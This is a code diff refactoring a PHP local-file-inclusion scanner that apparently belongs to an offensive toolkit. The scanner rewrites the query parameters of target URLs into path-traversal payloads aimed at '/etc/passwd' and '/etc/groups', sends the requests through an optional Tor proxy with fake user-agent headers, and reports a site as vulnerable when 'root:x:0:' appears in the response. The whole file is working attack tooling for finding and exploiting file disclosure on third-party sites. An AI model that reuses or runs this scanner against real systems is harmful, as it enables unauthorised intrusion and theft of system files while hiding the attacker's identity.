@@ -6,273 +6,123 @@ use Respect\Validation\Validator as v;
 use Aszone\FakeHeaders\FakeHeaders;
 use GuzzleHttp\Client;
 
-class LocalFileInclusion
+class LocalFileInclusion extends CommandDataConfig implements VulnerabilityScanner
 {
-    public $targets;
+    const EXPLOIT1 = "../etc/passwd";
+    const EXPLOIT2 = "../etc/groups";
+    const EXPLOIT1REGEX = "root:x:0:";
+    const EXPLOIT2REGEX = "root:x:0:";
 
-    public $target;
+    private $errors = [];
 
-    public $tor;
-
-    public $commandData;
-
-    public $exploit1;
-
-    public $exploit2;
-
-    public $exploit1Regex;
-
-    public $exploit2Regex;
-
-    public function __construct($commandData, $targets)
+    public function isVulnerable($target)
     {
-        //Check command of entered.
-        $defaultEnterData = $this->defaultEnterData();
-        $this->commandData = array_merge($defaultEnterData, $commandData);
-        if ($this->commandData['torl']) {
-            $this->commandData['tor'] = $this->commandData['torl'];
+        if ($this->isLfiPossible($target)) {
+            return $this->verify($target);
         }
-        $this->targets = $targets;
-        $this->exploit1= "../etc/passwd";
-        $this->exploit2= "../etc/groups";
-        $this->exploit1Regex= "root:x:0:";
-        $this->exploit2Regex= "root:x:0:";
-    }
-
-    private function defaultEnterData()
-    {
-        $dataDefault['dork'] = false;
-        $dataDefault['pl'] = false;
-        $dataDefault['tor'] = false;
-        $dataDefault['torl'] = false;
-        $dataDefault['virginProxies'] = false;
-        $dataDefault['proxyOfSites'] = false;
-
-        return $dataDefault;
-    }
-
-    public function check()
-    {
-        $result = [];
-        foreach ($this->targets as $searchEngenier) {
-            foreach ($searchEngenier as $keyTarget => $target) {
-                $this->target = urldecode(urldecode($target));
-                $resultCheck = $this->checkSuccess();
-                if($resultCheck){
-                    $result[]=$resultCheck;
-                }
-            }
-        }
-
-        return $result;
-    }
-
-    protected function getWordListInArray($wordlist)
-    {
-        $checkFileWordList = v::file()->notEmpty()->validate($wordlist);
-        if ($checkFileWordList) {
-            $targetResult = file($wordlist, FILE_IGNORE_NEW_LINES);
-
-            return $targetResult;
-        }
-
+        
         return false;
     }
 
-    protected function checkSuccess()
+    public function isLfiPossible($target)
     {
-        $isValidLfd = $this->isLfi($this->target);
-        if (!$isValidLfd) {
-            return false;
-        }
-
-        return $this->setVull();
+        return (bool) preg_match("/\?|(.+?)\=/", $target);
     }
 
-    protected function isLfi($target)
+    protected function verify($target)
     {
-        $validXss = preg_match("/\?|(.+?)\=/", $target, $m);
-        if ($validXss) {
-            return true;
-        }
+        $urls = $this->generateUrls($target);
+        
+        $this->output("\n");
 
-        return false;
-    }
+        foreach ($urls as $url) {
+            if ($this->attack($url)) {
+                $this->output('Is Vull');
 
-    protected function setVull()
-    {
-        //$ext=$this->getExtension($this->target);
-        $urlsForAttack = $this->generatesUrlForAttack();
-        $resultcheckAttack = [];
-        echo "\n";
-        foreach ($urlsForAttack as $urlAttack) {
-            $resultcheckAttack = $this->setAttack($urlAttack);
-            if (!empty($resultcheckAttack)) {
-                echo 'Is Vull';
-                return $urlAttack;
+                return $url;
             }
         }
 
         return false;
     }
 
-
-    protected function setAttack($url)
+    protected function attack($url)
     {
-        echo '.';
+        $this->output('.');
+
         $header = new FakeHeaders();
         $client = new Client(['defaults' => [
             'headers' => ['User-Agent' => $header->getUserAgent()],
             'proxy' => $this->commandData['tor'],
             'timeout' => 30,
-        ],
-        ]);
+        ]]);
+
         try {
             $body= $client->get($url)->getBody()->getContents();
-            if($body){
-                if($this->checkExistValueInBody($body) AND !$this->checkError($body)){
-                    return $url;
-                }
+            
+            if ($body 
+                && $this->checkSuccess($body) 
+                && !$this->checkError($body)
+            ) {
+                return $url;
             }
-
         } catch (\Exception $e) {
-            //echo "Error code => ".$e->getCode()."\n";
-            echo '#';
+            $this->output('#');
         }
 
         return false;
     }
 
-    protected function checkExistValueInBody($body){
-
-        //$valid=preg_match("/<script>alert\(aaabbbccc\);<\/script\>|<h1>aaabbbccc<\/h1>/",$body,$m);
-        $valid=preg_match("/".$this->exploit1Regex."|".$this->exploit2Regex."/",$body,$m);
-        if($valid){
-            return true;
-        }
-        return false;
-
+    protected function checkSuccess($body) 
+    {
+        return preg_match("/" . static::EXPLOIT1REGEX . "|" . static::EXPLOIT2REGEX . "/", $body);
     }
 
-    protected function generatesUrlForAttack()
+    public function generateUrls($target)
     {
-        echo "\n".$this->target;
-        $urlsFinal = [];
-        $urls1 = $this->generateUrlsByExploit($this->exploit1);
-        $urls2 = $this->generateUrlsByExploit($this->exploit2);
-        $urlsFinal = array_merge($urls1, $urls2);
-
-        return $urlsFinal;
+        $this->output("\n" . $target);
+        
+        $urls1 = $this->generateUrlsByExploit($target, static::EXPLOIT1);
+        $urls2 = $this->generateUrlsByExploit($target, static::EXPLOIT2);
+        
+        return array_merge($urls1, $urls2);
     }
 
-    protected function generateUrlsByExploit($exploit)
+    protected function generateUrlsByExploit($target, $exploit)
     {
-        $explodeUrl = parse_url($this->target);
+        $explodeUrl = parse_url($target);
         $explodeQuery = explode('&', $explodeUrl['query']);
 
-        //Identify and sets urls of values of Get
         foreach ($explodeQuery as $keyQuery => $query) {
             $explodeQueryEqual = explode('=', $query);
             $wordsValue[$explodeQueryEqual[0]] = $explodeQueryEqual[1];
         }
 
         foreach($wordsValue as $keyValue => $value){
-            $urls[]=str_replace($keyValue."=".$value,$keyValue."=??????????",$this->target);
+            $urls[] = str_replace($keyValue . "=" . $value, $keyValue . "=??????????", $target);
         }
 
         $urlFinal = [];
         foreach ($urls as $url) {
-
             $urlFinal[] = str_replace('??????????', $exploit, $url);
             $breakFolder="../";
-            for($i=0;$i<10;$i++){
-                $urlFinal[] = str_replace('??????????', $breakFolder.$exploit, $url);
-                $breakFolder.="../";
+
+            for ($i = 0; $i < 10; $i++) {
+                $urlFinal[] = str_replace('??????????', $breakFolder . $exploit, $url);
+                $breakFolder .= "../";
             }
         }
+
         return $urlFinal;
     }
 
-    protected function getNameFileUrl()
+    public function checkError($body)
     {
-        $resultUrl = parse_url($this->target);
-
-        return $resultUrl['path'];
-    }
-
-    protected function getExtension()
-    {
-        $url_parts = parse_url($this->target);
-        $isValidExt = preg_match("/\.(.*)/", $url_parts['path'], $m);
-        if ($isValidExt) {
-            return $m[1];
-        }
-
-        return false;
-    }
-
-    protected function getKeysUrl($target)
-    {
-        $url_parts = parse_url($target);
-        $parameters = explode('&', $url_parts['query']);
-        $resultFinal = [];
-
-        foreach ($parameters as $keyGet => $get) {
-            $resultLine = explode('=', $get);
-            $resultFinal[$keyGet][$resultLine[0]] = $resultLine[1];
-        }
-
-        return $resultFinal;
-    }
-
-    protected function sendMail($result)
-    {
-        //Send Mail with parcial results
-        $mailer = new Mailer();
-        if (empty($result)) {
-            $mailer->sendMessage('you@example.com', 'Fail, not finder password in list. =\\');
-        } else {
-            $msg = 'PHP Avenger Informer, SUCCESS:<br><br>Link Vull is '.$result;
-
-            $mailer->sendMessage('you@example.com', $msg);
-        }
-    }
-
-    protected function createNameFile()
-    {
-        return $this->getName().'_'.date('m-d-Y_hia');
-    }
-
-    protected function saveTxt($data, $filename)
-    {
-        $file = __DIR__.'/../../../results/'.$filename.'.txt';
-        $myfile = fopen($file, 'w') or die('Unable to open file!');
-        if (is_array($data)) {
-            foreach ($data as $dataType) {
-                foreach ($dataType as $singleData) {
-                    $txt = $singleData."\n";
-                    fwrite($myfile, $txt);
-                }
-            }
-        } else {
-            $txt = $data;
-            fwrite($myfile, $txt);
-        }
-        fclose($myfile);
-
-        if (!file_exists($file)) {
-            return false;
-        }
-
-        return true;
-    }
-
-    protected function checkError($body)
-    {
-        //echo $body;
-        $errors = $this->getErrorsOfList();
+        $errors = $this->getErrors();
+        
         foreach ($errors as $error) {
             $isValid = strpos($body, $error);
+
             if ($isValid !== false) {
                 return true;
             }
@@ -281,16 +131,33 @@ class LocalFileInclusion
         return false;
     }
 
-    protected function getErrorsOfList()
+    protected function getErrors()
     {
-        $errorsMysql = parse_ini_file(__DIR__ . '/resource/Errors/mysql.ini');
-        $errorsMariaDb = parse_ini_file(__DIR__ . '/resource/Errors/mariadb.ini');
-        $errorsOracle = parse_ini_file(__DIR__ . '/resource/Errors/oracle.ini');
-        $errorssqlServer = parse_ini_file(__DIR__ . '/resource/Errors/sqlserver.ini');
-        $errorsPostgreSql = parse_ini_file(__DIR__ . '/resource/Errors/postgresql.ini');
-        $errorsAsp = parse_ini_file(__DIR__ . '/resource/Errors/asp.ini');
-        $errorsPhp = parse_ini_file(__DIR__ . '/resource/Errors/php.ini');
+        if (! $this->errors) {
+            $this->loadErrors();
+        }
 
-        return array_merge($errorsMysql, $errorsMariaDb, $errorsOracle, $errorssqlServer, $errorsPostgreSql,$errorsAsp,$errorsPhp );
+        return $this->errors;
+    }
+
+    protected function loadErrors()
+    {
+        $errorsMysql = parse_ini_file(__DIR__ . '/../resources/Errors/mysql.ini');
+        $errorsMariaDb = parse_ini_file(__DIR__ . '/../resources/Errors/mariadb.ini');
+        $errorsOracle = parse_ini_file(__DIR__ . '/../resources/Errors/oracle.ini');
+        $errorssqlServer = parse_ini_file(__DIR__ . '/../resources/Errors/sqlserver.ini');
+        $errorsPostgreSql = parse_ini_file(__DIR__ . '/../resources/Errors/postgresql.ini');
+        $errorsAsp = parse_ini_file(__DIR__ . '/../resources/Errors/asp.ini');
+        $errorsPhp = parse_ini_file(__DIR__ . '/../resources/Errors/php.ini');
+
+        $this->errors = array_merge(
+            $errorsMysql, 
+            $errorsMariaDb, 
+            $errorsOracle, 
+            $errorssqlServer, 
+            $errorsPostgreSql,
+            $errorsAsp,
+            $errorsPhp 
+        );
     }
 }
